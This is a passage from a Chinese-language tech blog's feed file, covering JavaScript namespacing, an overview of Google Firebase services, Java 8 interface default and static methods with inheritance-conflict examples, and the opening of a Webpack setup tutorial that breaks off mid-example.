0</span><br></pre></td></tr></table></figure><p>我们一直以id生成器工具为例，无法充分发挥这种模式的潜力。 通过包装整个库并使用this关键字作为namespace的代表，我们使用户可以轻松地在他们选择的任何context（包括全局context）中运行该库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;library code</span><br><span class="line">var protoQueryMooJo &#x3D; function() &#123;  </span><br><span class="line">    &#x2F;&#x2F;everything</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;user code</span><br><span class="line">var thirdParty &#x3D; &#123;&#125;;</span><br><span class="line">protoQueryMooJo.apply(thirdParty);</span><br></pre></td></tr></table></figure><h1 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h1><p>尽量避免嵌套名称空间。 它们更难维护（对于人和计算机而言），并且会使代码可读性变差。 正如Peter Michaux指出的那样，深层嵌套的名称空间可能是怀旧Java开发人员试图重新创建他们熟悉和喜爱的冗长包链的遗产。</p><p>可以跨.js文件跨越单个namespace（尽管只能通过名称空间注入或每个变量的直接分配），但是应谨慎使用依赖项。 此外，将命名空间绑定到文件可以帮助读者更轻松地浏览代码行。</p><p>由于JavaScript没有正式的namespace构造，因此存在大量的本地解决方案。 这篇文章仅详细介绍了其中一些。</p><h1 id="Further-reading"><a href="#Further-reading" class="headerlink" title="Further reading"></a>Further reading</h1><p>James Edwards: <a href="http://blogs.sitepoint.com/2010/11/30/my-favorite-javascript-design-pattern/">My Favorite JavaScript Design Pattern</a><br>Peter Michaux: <a href="http://michaux.ca/articles/javascript-namespacing">JavaScript Namespacing</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Firebase 介绍</title>
      <link href="/2020/10/25/Google-Firebase-%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/10/25/Google-Firebase-%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>对于写android程序的人， Google firebase 并不陌生，在发送消息通知的时候，我们通常会用到FCM(Firebase cloud message), 除此之外，firebase还能做什么呢？</p><h1 id="什么是firebase"><a href="#什么是firebase" class="headerlink" title="什么是firebase"></a>什么是firebase</h1><p>Firebase是一家实时后端数据库创业公司，它能帮助开发者很快的写出Web端和移动端的应用。自2014年10月Google收购Firebase以来，用户可以在更方便地使用Firebase的同时，结合Google的云服务。</p><p>2014年10月，Google收购Firebase。</p><p>Firebase是Google旗下的一款实时数据云服务平台，旨在让APP提供一个实时响应的数据服务，该平台适用在IOS、Android、web前端等各种跨平台上。<br>Firebase能让你的App从零到一。也就是说它可以帮助手机以及网页应用的开发者轻松构建App。通过Firebase背后负载的框架就可以简单地开发一个App，无服务器以及基础设施。</p><p>谷歌将Firebase划分成两个大功能：一个是构建更好的应用，这个主要是简化开发者的开发工作，提供包含实时数据库，崩溃报告，身份验证等功能；一个是扩大受众，侧重于给运营提供支持，提供Analytics,云消息传递，动态链接等.</p><h1 id="构建和测试您的应用"><a href="#构建和测试您的应用" class="headerlink" title="构建和测试您的应用"></a>构建和测试您的应用</h1><h2 id="实时数据库"><a href="#实时数据库" class="headerlink" title="实时数据库"></a>实时数据库</h2><p>使用云托管的 NoSQL 数据库存储数据以及在各个用户和设备之间实时同步数据。更新后的数据会在数毫秒内同步到各个已连接的设备，且数据在应用离线后仍然可用，无论网络连接状况如何，都能提供良好的用户体验。</p><h2 id="崩溃报告"><a href="#崩溃报告" class="headerlink" title="崩溃报告"></a>崩溃报告</h2><p>通过详细的错误报告和崩溃报告来诊断移动应用中的问题。您可以在”Firebase Crash”信息中心内按照错误和崩溃的出现频率与影响的严重程度对报告进行优先级排序，还可以在该信息中心内监控应用的总体运行状况以及跟踪用户流。您可以随时随地通过电子邮件通知获悉相关信息。</p><h2 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h2><p>以简单安全的方式管理您的用户。Firebase 身份验证提供了多种身份验证方法，包括电子邮件地址/密码、Google 或 Facebook 等第三方提供商，或直接使用您现有的帐号系统。构建您自己的界面，或者利用我们的开放源代码以及完全可自定义的界面。</p><h2 id="Cloud-Functions"><a href="#Cloud-Functions" class="headerlink" title="Cloud Functions"></a>Cloud Functions</h2><p>使用自定义后端代码扩展您的应用，而无需管理和扩展您自己的服务器。Firebase 产品、Google Cloud 服务或第三方使用 webhook 发出的事件可触发 Cloud Functions。</p><h2 id="Cloud-Storage"><a href="#Cloud-Storage" class="headerlink" title="Cloud Storage"></a>Cloud Storage</h2><p>使用专为类似于 Google 这种规模级别的应用打造的功能强大、操作简单且经济有效的对象存储服务，轻松地存储和分享图片、音频、视频或其他用户生成的内容。无论网络质量如何，适用于 Cloud Storage 的 Firebase SDK 都能为您的 Firebase 应用提供 Google 安全品质的文件上传和下载服务。</p><h2 id="托管"><a href="#托管" class="headerlink" title="托管"></a>托管</h2><p>使用专为现代网页应用制作的工具简化您的静态网页托管工作。在您上传自己的网页资源后，我们会自动将其推送到我们的全球 CDN，并为其授予免费的 SSL 证书，以便您的用户无论身处何处都能获得安全、可靠、低延时的体验。</p><h2 id="Android-测试实验室"><a href="#Android-测试实验室" class="headerlink" title="Android 测试实验室"></a>Android 测试实验室</h2><p>在由 Google 托管的虚拟和真机设备上为您的应用运行自动化和自定义测试。在您的整个开发生命周期中使用 Firebase 测试实验室来查找错误和不一致的地方，这样您就可以在各种设备上提供优质的体验。</p><h1 id="扩大和吸引受众群体"><a href="#扩大和吸引受众群体" class="headerlink" title="扩大和吸引受众群体"></a>扩大和吸引受众群体</h1><h2 id="Analytics"><a href="#Analytics" class="headerlink" title="Analytics"></a>Analytics</h2><p>在单个信息中心内分析用户归因和行为，以便对您的产品路线图做出明智的决定。从报告获取实时分析结果，或将您的原始事件数据导出到 Google BigQuery 以进行自定义分析。</p><h2 id="云消息传递"><a href="#云消息传递" class="headerlink" title="云消息传递"></a>云消息传递</h2><p>跨各种平台（Android、iOS 和网页）免费向用户发送消息和通知。消息可以发送到单个设备、设备组、订阅了特定主题的用户或细分用户群。FCM 可以根据应用进行扩展，即使是规模最大的应用也能处理，每天可传送数千亿条消息。</p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>使用深层链接为 iOS、Android 和网页应用提供自定义的用户体验。您可以使用深层链接帮助移动网页促进原生应用的转化、用户间分享、社交和营销广告系列等。动态链接为您提供了归因工具，以便更好地了解您的移动用户增长情况。</p><h2 id="远程配置"><a href="#远程配置" class="headerlink" title="远程配置"></a>远程配置</h2><p>自定义您的应用针对每个用户的呈现方式。改变外观和风格，逐步推出功能，运行 A/B 测试，向某些用户提供自定义的内容，或在不部署新版本的情况下进行其他更新，所有这些操作都可以在 Firebase 控制台中进行。监控您所做更改的影响，并在几分钟内进行调整。</p><h2 id="邀请"><a href="#邀请" class="headerlink" title="邀请"></a>邀请</h2><p>可以让您的用户通过电子邮件或短信分享您的应用的方方面面，从引荐代码到收藏的内容。此开箱即用的解决方案与 Firebase Analytics 配合使用，因此您可以知道用户何时通过邀请打开或安装了应用。</p><h2 id="App-Indexing"><a href="#App-Indexing" class="headerlink" title="App Indexing"></a>App Indexing</h2><p>通过集成 Google 搜索，重新吸引用户使用他们已安装的应用。如果用户已装有您的应用并且搜索相关内容，则可以直接从搜索结果中启动该应用。如果用户还没有安装您的应用，则当他们搜索类似的应用时系统将显示一张安装卡片。</p><h2 id="AdMob"><a href="#AdMob" class="headerlink" title="AdMob"></a>AdMob</h2><p>通过向全球受众展示有吸引力的广告来赚取收益。AdMob 具备各种功能，能够为您实施一流的获利策略并最大程度地提高每个用户带来的收入。它可以针对您的应用进行定制，其 API 可轻松集成丰富的广告格式。</p><h2 id="AdWords"><a href="#AdWords" class="headerlink" title="AdWords"></a>AdWords</h2><p>借助 Google 的影响力获得并留住用户。您可以在搜索网络、展示广告网络和视频中投放广告，还可以将广告定位到您在 Firebase Analytics 中定义的特定细分用户群。改进广告定位功能并优化广告系列的效果。</p><p>整体上来说，Firebase的功能非常强大，但不是所有的人都需要用到里面的所有的功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 接口方法</title>
      <link href="/2020/10/25/Java-%E6%8E%A5%E5%8F%A3%E6%96%B9%E6%B3%95/"/>
      <url>/2020/10/25/Java-%E6%8E%A5%E5%8F%A3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>转自 <strong>Java 技术栈</strong> 微信公众号</p><p>最近面试一些 Java 程序员，不乏工作 4、5 年经验的，当我问他一些 Java 8 的新特性时，大多却答不上来。</p><p>比如下面这道题：</p><p>栈长：接口里面可以写方法吗？</p><p>小A：当然可以啊，默认就是抽象方法。</p><p>栈长：那接口里面可以写实现方法吗？</p><p>小A：不可以，所有方法必须是抽象的。</p><p>栈长：你确定吗？</p><p>小A：确定……</p><p>小A看起来对我的问题有点怀疑人生，心里肯定估摸着，我不会在给他埋了什么坑吧。然后他还是仔细再想了一下，最后还是斩钉截铁的告诉我：接口里面只能写抽象方法，不能写实现方法。</p><p>栈长：接口里面是可以写实现方法的，Java 8 开始就可以了，你用过 Java 8 吗?</p><p>小A：好吧，看来是我学艺不精，Java 8 有了解一点，比如那个 Lambda 表达式，但实际项目中也没怎么用。</p><p>通过和小A的交流，我也看到了许多开发者的问题，虽然开发版本用的是 Java 8，但实际用的还是 Java 8 之前的最基础的语法，对 Java 8 新增的特性一无所知。</p><p>Java 8 至 2014 年发布至今，已经过了 6 个年头了，最新的 Java 14 都发布了，OK，这个不在本篇讨论范围之内， Java  8+ 系列教程请关注公众号Java技术栈回复 “java” 进行阅读，本篇就是想顺着问小A的这个问题展开。</p><p>什么是默认方法和静态方法？</p><p>上面也说了，Java 8 开始是可以有方法实现的，可以在接口中添加默认方法和静态方法。</p><p>默认方法用 default 修饰，只能用在接口中，静态方法用 static 修饰，这个我们不陌生了。并且接口中的默认方法、静态方法可以同时有多个。</p><p>在接口中写实现方法一点也不稀奇，像这样的用法，从 Java 8 到 Java 14 已是遍地开花，到处都可以看到接口默认方法和静态方法的身影。</p><p>比如我们来看下在 JDK API 中 java.util.Map 关于接口默认方法和静态方法的应用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">public interface Map&lt;K,V&gt; &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line"></span><br><span class="line">    * 接口默认方法</span><br><span class="line"></span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    default boolean remove(Object key, Object value) &#123;</span><br><span class="line"></span><br><span class="line">        Object curValue &#x3D; get(key);</span><br><span class="line"></span><br><span class="line">        if (!Objects.equals(curValue, value) ||</span><br><span class="line"></span><br><span class="line">            (curValue &#x3D;&#x3D; null &amp;&amp; !containsKey(key))) &#123;</span><br><span class="line"></span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        remove(key);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line"></span><br><span class="line">    * 接口静态方法</span><br><span class="line"></span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    public static &lt;K extends Comparable&lt;? super K&gt;, V&gt; Comparator&lt;Map.Entry&lt;K,V&gt;&gt; comparingByKey() &#123;</span><br><span class="line"></span><br><span class="line">        return (Comparator&lt;Map.Entry&lt;K, V&gt;&gt; &amp; Serializable)</span><br><span class="line"></span><br><span class="line">            (c1, c2) -&gt; c1.getKey().compareTo(c2.getKey());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>为什么要有接口默认方法？</p><p>举一个很现实的例子：</p><p>我们的接口老早就写好了，后面因为各种业务问题，避免不了要修改接口。</p><p>在 Java 8 之前，比如要在一个接口中添加一个抽象方法，那所有的接口实现类都要去实现这个方法，不然就会编译错误，而某些实现类根本就不需要实现这个方法也被迫要写一个空实现，改动会非常大。</p><p>所以，接口默认方法就是为了解决这个问题，只要在一个接口添加了一个默认方法，所有的实现类就自动继承，不需要改动任何实现类，也不会影响业务，爽歪歪。</p><p>另外，接口默认方法可以被接口实现类重写。</p><p>为什么要有接口静态方法？</p><p>接口静态方法和默认方法类似，只是接口静态方法不可以被接口实现类重写。</p><p>接口静态方法只可以直接通过静态方法所在的 接口名.静态方法名 来调用。</p><p>接口默认方法多继承冲突问题</p><p>因为接口默认方法可以被继承并重写，如果继承的多个接口都存在相同的默认方法，那就存在冲突问题。</p><p>下面我会列举 3 个冲突示例场景。</p><p>冲突一</p><p>来看下面这段程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface People &#123;</span><br><span class="line"></span><br><span class="line"> default void eat()&#123;</span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;人吃饭&quot;);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Man &#123;</span><br><span class="line"></span><br><span class="line"> default void eat()&#123;</span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;男人吃饭&quot;);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Boy extends Man, People &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Boy 同时继承了 People 和 Man，此时在 IDEA 编辑器中就会报错：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-0c588a56f71b64fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6402.png"></p><p>这就是接口多继承带来的冲突问题，Boy 不知道该继承谁的，这显然也是个问题，IDEA 也会提示，需要重写这个方法才能解决问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Boy extends Man, People &#123;</span><br><span class="line"></span><br><span class="line"> @Override</span><br><span class="line"></span><br><span class="line"> default void eat() &#123;</span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;男孩吃饭&quot;);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在方法里面还能直接调用指定父接口的默认方法，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">interface Boy extends Man, People &#123;</span><br><span class="line"></span><br><span class="line"> @Override</span><br><span class="line"></span><br><span class="line"> default void eat() &#123;</span><br><span class="line"></span><br><span class="line">  People.super.eat();</span><br><span class="line"></span><br><span class="line">  Man.super.eat();</span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;男孩吃饭&quot;);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再加个实现类测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static class Student implements Boy &#123;</span><br><span class="line"></span><br><span class="line"> public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">  Student student &#x3D; new Student();</span><br><span class="line"></span><br><span class="line">  student.eat();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><p>人吃饭</p><p>男人吃饭</p><p>男孩吃饭</p><p>嗯，很强大！</p><p>冲突二</p><p>我们再换一种写法，把 Man 继承 People，然后 Man 重写 People 中的默认方法。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-053e6cbdd838baa6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6401.png"></p><p>此时，编辑器不报错了，而 People 的默认方法置灰了，提示没有被用到。</p><p>再运行一下上面的示例，输出：</p><p>男人吃饭</p><p>因为 Man 继承 People，Man 又重定了默认方法。很显然，这个时候，Boy 知道该继承谁的默认方法了。</p><p>冲突三</p><p>在 Man 接口中新增一个方法：say，然后在 Boy 接口中新增一个默认方法：say。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-1aa6f0c754aefa60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="640.png"></p><p>这时候，Man 中的抽象方法居然被忽略了，IDEA 都提示说没用到，这显然是默认方法优先于抽象方法。</p><p>总结</p><p>本文介绍了 Java 8 的默认方法和静态方法，以及默认方法的冲突问题解决方案。所以，大家出去面试时，再也不要说接口不能写实现方法了，那就太 OUT 了。。</p><p>文中只举了 3 个默认方法的冲突场景，不确定还没有更多冲突问题。默认方法虽然解决了接口变动带来的问题，但如果设计不当，或者过度设计，其带来的方法冲突问题也是需要引起注意的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack 入门</title>
      <link href="/2020/10/10/Webpack-%E5%85%A5%E9%97%A8/"/>
      <url>/2020/10/10/Webpack-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是Webpack？"><a href="#一、什么是Webpack？" class="headerlink" title="一、什么是Webpack？"></a>一、什么是Webpack？</h1><p>作为其核心，webpack是一个静态模块捆绑器。在特定项目中，webpack将所有文件和资产视为模块。在后台，它依赖于依赖图。依赖图描述了模块之间如何使用文件之间的引用（require和import语句）相互关联。这样，webpack会静态遍历所有模块以构建图，并使用它生成单个捆绑包（或多个捆绑包）-一个JavaScript文件，其中包含所有模块以正确顺序组合而成的代码。“静态地”表示，当webpack构建其依赖关系图时，它不执行源代码，而是将模块及其依赖关系缝合在一起。然后可以将其包含在HTML文件中。</p><h1 id="二、概念介绍"><a href="#二、概念介绍" class="headerlink" title="二、概念介绍"></a>二、概念介绍</h1><h3 id="Entry-point-入口"><a href="#Entry-point-入口" class="headerlink" title="Entry point(入口)"></a>Entry point(入口)</h3><p>Webpack的<strong>entry point</strong>是收集前端项目的所有依赖项的起点。 实际上，这是一个简单的JavaScript文件。</p><p>这些依赖关系形成依赖关系图。</p><p>Webpack的默认<strong>entry point</strong>（从版本4开始）是src / index.js，它是可配置的。 webpack可以有多个<strong>entry point</strong>。</p><h3 id="Output-输出"><a href="#Output-输出" class="headerlink" title="Output(输出)"></a>Output(输出)</h3><p><strong>output</strong>是在构建过程中收集生成的JavaScript和静态文件的位置。<br>Webpack的默认<strong>output</strong>文件夹（自版本4起）为dist /，也可以配置。<br>生成的JavaScript文件是所谓的bundle的一部分。</p><h3 id="Loaders-加载程序"><a href="#Loaders-加载程序" class="headerlink" title="Loaders(加载程序)"></a>Loaders(加载程序)</h3><p><strong>loader</strong>是第三方扩展程序，可帮助webpack处理各种文件扩展名。 例如，有用于CSS，图像或txt文件的<strong>loader</strong>。<br><strong>loaders</strong>的目标是在module中转换文件（JavaScript以外的文件）。 文件成为module后，webpack可以将其用作项目中的依赖项。</p><h3 id="Plugins-插件"><a href="#Plugins-插件" class="headerlink" title="Plugins(插件)"></a>Plugins(插件)</h3><p><strong>Plugins</strong>是第三方扩展，可以更改webpack的工作方式。 例如，有一些用于提取HTML，CSS或设置环境变量的<strong>Plugin</strong>。</p><h3 id="Mode-模式"><a href="#Mode-模式" class="headerlink" title="Mode(模式)"></a>Mode(模式)</h3><p>webpack有两种操作模式：开发和生产。 它们之间的主要区别是生产模式自动将最小化和其他优化应用于JavaScript代码。</p><h3 id="Code-splitting-代码拆分"><a href="#Code-splitting-代码拆分" class="headerlink" title="Code splitting(代码拆分)"></a>Code splitting(代码拆分)</h3><p>代码拆分或延迟加载是一种避免较大bundle产生的优化技术。<br>通过代码拆分，开发人员可以决定仅加载响应某些用户交互（例如单击或路由更改（或其他条件））的整个JavaScript代码块。<br>被拆分的一段代码变成了一个代码块(chunk)。</p><h1 id="三、动手实践"><a href="#三、动手实践" class="headerlink" title="三、动手实践"></a>三、动手实践</h1><p>要开始使用webpack，请创建一个新文件夹并在命令行中进入那个文件夹，初始化NPM项目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir webpack-tutorial &amp;&amp; cd $_</span><br><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>接着安装webpack, webpack-cli, 和 webpack-dev-server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack webpack-cli webpack-dev-server --save-dev</span><br></pre></td></tr></table></figure><p>如果要用NPM脚本运行webpack，打开package.json并配置一个“ dev”脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;dev&quot;: &quot;webpack --mode development&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>上述脚本，我们指定webpack在开发模式下工作，便于本地调试。</p><h3 id="运行webpack的步骤"><a href="#运行webpack的步骤" class="headerlink" title="运行webpack的步骤"></a>运行webpack的步骤</h3><p>让webpack在开发模式下运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p>可能会有以下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR in Entry module not found: Error: Can&#39;t resolve &#39;.&#x2F;src&#39;</span><br></pre></td></tr></table></figure><p>webpack在这里寻找默认 <strong>entry point</strong> src / index.js 创建src文件夹，并在src内创建一个简单的JavaScript文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir src</span><br><span class="line">echo &#39;console.log(&quot;Hello webpack!&quot;)&#39; &gt; src&#x2F;index.js</span><br></pre></td></tr></table></figure><p>现在再次运行npm run dev，应该不会再看到错误。 运行输出结果在一个叫dist/的新文件夹，其中包含一个名为main.js的JavaScript文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dist</span><br><span class="line">└── main.js</span><br></pre></td></tr></table></figure><p>这是我们生成的第一个Webpack bundle，也称为output。</p><h3 id="配置webpack"><a href="#配置webpack" class="headerlink" title="配置webpack"></a>配置webpack</h3><p>对于简单的任务，webpack无需配置就可以工作，但是很快就会遇到一些限制。 通过文件配置webpack，需在项目文件夹中创建webpack.config.js：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch webpack.config.js</span><br></pre></td></tr></table></figure><p>Webpack用JavaScript编写，并在无头JavaScript环境（例如Node.js）上运行。 在这个文件中，至少需要定义module.exports，这是Node.js的Common JS导出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在webpack.config.js中，我们可以更改webpack的行为：</p><ul><li>entry point</li><li>output</li><li>loaders</li><li>plugins</li><li>code splitting</li></ul><p>例如，要改变entry point的路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  entry: &#123; index: path.resolve(__dirname, &quot;source&quot;, &quot;index.js&quot;) &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在，webpack将在source / index.js中查找要加载的第一个文件。 更改包的输出路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, &quot;build&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在webpack会将生成的bundle输出到build文件夹而不是dist中。 （为简单起见，我们还是用默认输出路径）。</p><h3 id="webpack-与-HTML"><a href="#webpack-与-HTML" class="headerlink" title="webpack 与 HTML"></a>webpack 与 HTML</h3><p>没有HTML页面的Web应用程序几乎没有用。 要在webpack中使用HTML，我们需要安装一个插件html-webpack-plugin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i html-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure><p>插件装好后，我们可以在配置中使用他：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&quot;html-webpack-plugin&quot;);</span><br><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: path.resolve(__dirname, &quot;src&quot;, &quot;index.html&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里是让webpack 从src / index.html加载HTML。</p><p>html-webpack-plugin的最终目标有两个：</p><ul><li><p>它加载我们的HTML文件</p></li><li><p>它将bundle注入到包含这些bundle文件的html文件中</p><p>现在，我们在src / index.html中创建一个简单的HTML页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html 